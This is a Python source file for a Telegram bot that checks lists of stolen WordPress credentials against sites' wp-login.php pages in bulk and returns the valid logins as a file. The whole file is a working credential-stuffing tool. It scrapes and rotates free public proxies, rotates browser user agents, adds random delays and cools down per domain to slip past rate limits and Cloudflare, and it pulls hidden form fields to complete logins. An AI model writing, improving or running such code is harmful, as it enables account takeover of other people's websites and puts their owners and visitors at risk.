#!/usr/bin/env python3
"""
WP Login Checker Bot - Render Compatible
"""

import os
import sys
import logging
import threading
import re
import json
import random
import time
from datetime import datetime

# ============ CRITICAL: Create Event Loop BEFORE Any Imports ============
import asyncio

# Create event loop for main thread
try:
    loop = asyncio.get_event_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

# Now import other modules
import requests
from flask import Flask
from pyrogram import Client, filters
from pyrogram.types import Message

# ============ CONFIG ============

API_ID = int(os.environ.get("API_ID", "0") or "0")
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMINS = os.environ.get("ADMINS", "")
LEGACY_PROXIES = os.environ.get("PROXIES", "")
MIN_DELAY = float(os.environ.get("MIN_DELAY", "20"))
MAX_DELAY = float(os.environ.get("MAX_DELAY", "50"))

ALLOWED_USERS = []
if ADMINS:
    ALLOWED_USERS = [int(id.strip()) for id in ADMINS.split(',') if id.strip().isdigit()]

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

def is_admin(user_id):
    return user_id in ALLOWED_USERS if ALLOWED_USERS else False

# ============ FLASK SERVER ============

flask_app = Flask(__name__)

@flask_app.route("/")
def health_check():
    return "✅ Bot is running", 200

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    flask_app.run(host="0.0.0.0", port=port, use_reloader=False, threaded=True)

# ============ PROXY MANAGEMENT ============

_MEMORY_PROXIES = []
_LAST_REFRESH = None

def fetch_proxies_sync():
    """Fetch proxies synchronously"""
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&limit=100",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    ]
    
    all_proxies = []
    
    for url in sources:
        try:
            resp = requests.get(url, timeout=15)
            if resp.status_code == 200:
                for line in resp.text.strip().split('\n'):
                    line = line.strip()
                    if ':' in line and not line.startswith('#'):
                        proxy = line.split('@')[-1] if '@' in line else line
                        if not proxy.startswith('http'):
                            proxy = f"http://{proxy}"
                        try:
                            ip, port = proxy.replace('http://', '').split(':')
                            if ip.count('.') == 3 and port.isdigit():
                                all_proxies.append(proxy)
                        except:
                            pass
        except Exception as e:
            logger.debug(f"Source failed: {e}")
    
    # Deduplicate
    seen = set()
    unique = []
    for p in all_proxies:
        if p not in seen:
            seen.add(p)
            unique.append(p)
    
    logger.info(f"Fetched {len(unique)} unique proxies")
    return unique[:100]

def check_proxy_simple(proxy):
    """Simple proxy check"""
    try:
        proxies = {'http': proxy, 'https': proxy}
        resp = requests.get(
            "http://httpbin.org/ip",
            proxies=proxies,
            timeout=10
        )
        return resp.status_code == 200
    except:
        return False

def refresh_proxies_sync():
    """Refresh proxies"""
    global _MEMORY_PROXIES, _LAST_REFRESH
    
    logger.info("=" * 40)
    logger.info("🔄 Refreshing proxies...")
    
    try:
        all_proxies = fetch_proxies_sync()
        if len(all_proxies) < 20:
            logger.warning("Too few proxies fetched")
            return False
        
        logger.info(f"🔍 Testing {min(30, len(all_proxies))} proxies...")
        working = []
        
        for proxy in all_proxies[:30]:
            if check_proxy_simple(proxy):
                working.append(proxy)
        
        if len(working) < 3:
            logger.warning(f"Only {len(working)} working, keeping old")
            return False
        
        _MEMORY_PROXIES = working
        _LAST_REFRESH = datetime.now()
        
        logger.info(f"✅ {len(working)} working proxies ready")
        return True
        
    except Exception as e:
        logger.error(f"❌ Refresh failed: {e}")
        return False

def get_random_proxy():
    """Get random working proxy"""
    if _MEMORY_PROXIES:
        return random.choice(_MEMORY_PROXIES)
    if LEGACY_PROXIES:
        legacy = [p.strip() for p in LEGACY_PROXIES.split(',') if p.strip()]
        return random.choice(legacy) if legacy else None
    return None

def auto_refresh_loop():
    """Background thread for auto-refresh"""
    refresh_proxies_sync()
    while True:
        time.sleep(1800)  # 30 minutes
        refresh_proxies_sync()

# Start auto-refresh
threading.Thread(target=auto_refresh_loop, daemon=True).start()

# ============ ANTI-DETECTION ============

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
]

FAILED_DOMAINS = {}

def get_headers():
    ua = random.choice(USER_AGENTS)
    return {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'DNT': '1',
    }

def mark_failed(domain):
    FAILED_DOMAINS[domain] = time.time()

def is_cooled(domain):
    if domain in FAILED_DOMAINS:
        return time.time() - FAILED_DOMAINS[domain] < 300
    return False

# ============ PARSER ============

def parse_line(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    parts = line.split(':')
    if len(parts) < 3:
        return None
    
    url = parts[0]
    rest = ':'.join(parts[1:])
    creds = rest.rsplit(':', 1)
    if len(creds) != 2:
        return None
    
    return (clean_url(url), creds[0], creds[1])

def clean_url(url):
    url = url.strip().lower()
    if not url.startswith('http'):
        url = 'https://' + url
    
    if '/wp-login.php' not in url:
        url = url.rstrip('/') + '/wp-login.php'
    else:
        url = url.split('?')[0]
    
    return url

# ============ LOGIN CHECKER ============

def check_login_sync(url, user, pwd):
    """Synchronous login check"""
    domain = url.split('/')[2]
    
    if is_cooled(domain):
        time.sleep(60)
    
    proxy = get_random_proxy()
    proxies = {'http': proxy, 'https': proxy} if proxy else None
    
    # Random delay
    time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))
    
    session = requests.Session()
    headers = get_headers()
    
    try:
        # GET login page
        resp = session.get(url, headers=headers, timeout=20, proxies=proxies)
        
        if resp.status_code == 403:
            mark_failed(domain)
            return None, '403 Blocked'
        
        if resp.status_code == 429:
            mark_failed(domain)
            time.sleep(120)
            return None, '429 Rate limited'
        
        # Cloudflare check
        if any(x in resp.text for x in ['cf-ray', '__cf_bm', 'Just a moment']):
            mark_failed(domain)
            return None, 'Cloudflare'
        
        # Build payload
        payload = {
            'log': user,
            'pwd': pwd,
            'rememberme': 'forever',
            'wp-submit': 'Log In',
            'testcookie': '1'
        }
        
        # Extract hidden fields
        for match in re.finditer(r'name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', resp.text):
            name, val = match.groups()
            if name not in payload:
                payload[name] = val
        
        # POST login
        time.sleep(random.uniform(2, 5))
        
        post_headers = headers.copy()
        post_headers['Content-Type'] = 'application/x-www-form-urlencoded'
        post_headers['Referer'] = url
        
        resp = session.post(
            url,
            data=payload,
            headers=post_headers,
            timeout=20,
            proxies=proxies,
            allow_redirects=True
        )
        
        # Check cookies
        cookies = [c.name for c in session.cookies]
        
        # Success checks
        if any('wordpress_logged_in' in c for c in cookies):
            return True, 'Logged in cookie'
        
        if '/wp-admin' in resp.url and 'login' not in resp.url:
            return True, 'Admin redirect'
        
        # Failure checks
        text = resp.text.lower()
        if 'incorrect' in text or 'invalid' in text:
            return False, 'Wrong credentials'
        
        return None, 'Unknown response'
        
    except requests.Timeout:
        return None, 'Timeout'
    except Exception as e:
        return None, str(e)[:50]

# ============ BATCH PROCESSING ============

def process_batch_sync(credentials, progress_callback=None):
    """Process batch synchronously"""
    results = {'valid': [], 'invalid': [], 'error': [], 'total': len(credentials)}
    
    for i, (url, user, pwd) in enumerate(credentials):
        if progress_callback:
            progress_callback(i + 1, len(credentials), user)
        
        if i > 0:
            time.sleep(random.uniform(5, 10))
        
        valid, reason = check_login_sync(url, user, pwd)
        line = f"{url}:{user}:{pwd}"
        
        if valid is True:
            results['valid'].append({'line': line, 'reason': reason})
        elif valid is False:
            results['invalid'].append({'line': line, 'reason': reason})
        else:
            results['error'].append({'line': line, 'reason': reason})
    
    return results

# ============ TELEGRAM BOT ============

bot = Client(
    "wp_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    in_memory=True
)

@bot.on_message(filters.command("start"))
async def cmd_start(c, m):
    uid = m.from_user.id
    await m.reply(f"""👋 **WP Checker Bot**

**Your ID:** `{uid}`

**Commands:**
• `/check <url> <user> <pass>` - Single check
• `/checkfile` - Upload .txt file
• `/status` - Bot status
• `/refresh` - Refresh proxies

**Format:** `https://site.com:admin:password`

Add `{uid}` to ADMINS env var.""")

@bot.on_message(filters.command("status"))
async def cmd_status(c, m):
    if not is_admin(m.from_user.id):
        return await m.reply("⛔ Not authorized")
    
    lr = _LAST_REFRESH
    await m.reply(f"""📊 **Status**

🤖 Bot: **Online**
📡 Proxies: **{len(_MEMORY_PROXIES)}** working
⏱️ Delay: **{MIN_DELAY}s - {MAX_DELAY}s**
🕐 Last refresh: **{lr.strftime('%H:%M:%S') if lr else 'Never'}**

**Protection:**
✅ Proxy rotation
✅ Random delays  
✅ Domain cooldown""")

@bot.on_message(filters.command("refresh"))
async def cmd_refresh(c, m):
    if not is_admin(m.from_user.id):
        return await m.reply("⛔ Not authorized")
    
    msg = await m.reply("🔄 Refreshing proxies...")
    
    def do_refresh():
        return refresh_proxies_sync()
    
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, do_refresh)
    
    if result:
        await msg.edit(f"✅ Refreshed! **{len(_MEMORY_PROXIES)}** proxies ready")
    else:
        await msg.edit("⚠️ Refresh failed")

@bot.on_message(filters.command("check"))
async def cmd_check(c, m):
    if not is_admin(m.from_user.id):
        return await m.reply("⛔ Not authorized")
    
    args = m.text.split()[1:]
    if len(args) < 3:
        return await m.reply("❌ Usage: `/check url user pass`")
    
    url = clean_url(args[0])
    user, pwd = args[1], ' '.join(args[2:])
    
    msg = await m.reply(f"⏳ Checking `{user}`...")
    
    def do_check():
        return check_login_sync(url, user, pwd)
    
    try:
        loop = asyncio.get_event_loop()
        valid, reason = await loop.run_in_executor(None, do_check)
        
        if valid is True:
            text = f"""✅ **VALID**

🔗 `{url}`
👤 `{user}`
🔑 `{pwd}`
📋 {reason}"""
        elif valid is False:
            text = f"""❌ **INVALID**

🔗 `{url}`
👤 `{user}`
📋 {reason}"""
        else:
            text = f"""⚠️ **ERROR**

🔗 `{url}`
👤 `{user}`
❌ {reason}"""
        
        await msg.edit(text)
    except Exception as e:
        await msg.edit(f"❌ Error: `{e}`")

@bot.on_message(filters.document & filters.private)
async def handle_file(c, m):
    if not is_admin(m.from_user.id):
        return await m.reply("⛔ Not authorized")
    
    if not m.document.file_name.endswith('.txt'):
        return await m.reply("❌ Only .txt files")
    
    if m.document.file_size > 5 * 1024 * 1024:
        return await m.reply("❌ Max 5MB")
    
    msg = await m.reply("📥 Downloading...")
    
    try:
        path = await m.download()
        
        # Parse credentials
        creds = []
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                p = parse_line(line)
                if p:
                    creds.append(p)
        
        if not creds:
            os.remove(path)
            return await msg.edit("❌ No valid credentials")
        
        total = len(creds)
        await msg.edit(f"🔍 Found **{total}** credentials\n⏱️ ETA: ~{total * 40 // 60} minutes")
        
        # Process in thread
        def do_batch():
            return process_batch_sync(creds)
        
        loop = asyncio.get_event_loop()
        results = await loop.run_in_executor(None, do_batch)
        
        # Save valid
        valid_file = f"valid_{datetime.now():%Y%m%d_%H%M%S}.txt"
        with open(valid_file, 'w') as f:
            for item in results['valid']:
                f.write(item['line'] + '\n')
        
        # Summary
        summary = f"""✅ **Complete!**

📊 Total: **{total}**
✅ Valid: **{len(results['valid'])}**
❌ Invalid: **{len(results['invalid'])}**
⚠️ Errors: **{len(results['error'])}**

📎 Valid logins attached:"""
        
        await msg.edit(summary)
        await m.reply_document(valid_file, caption="✅ Valid credentials")
        
        # Cleanup
        os.remove(path)
        os.remove(valid_file)
        
    except Exception as e:
        logger.error(f"File error: {e}")
        await msg.edit(f"❌ Error: `{e}`")

# ============ MAIN ============

if __name__ == "__main__":
    # Start Flask
    threading.Thread(target=run_flask, daemon=True).start()
    logger.info("🌐 Flask started")
    
    # Wait for initial proxy fetch
    time.sleep(3)
    
    # Start bot
    logger.info("🤖 Starting bot...")
    bot.run()
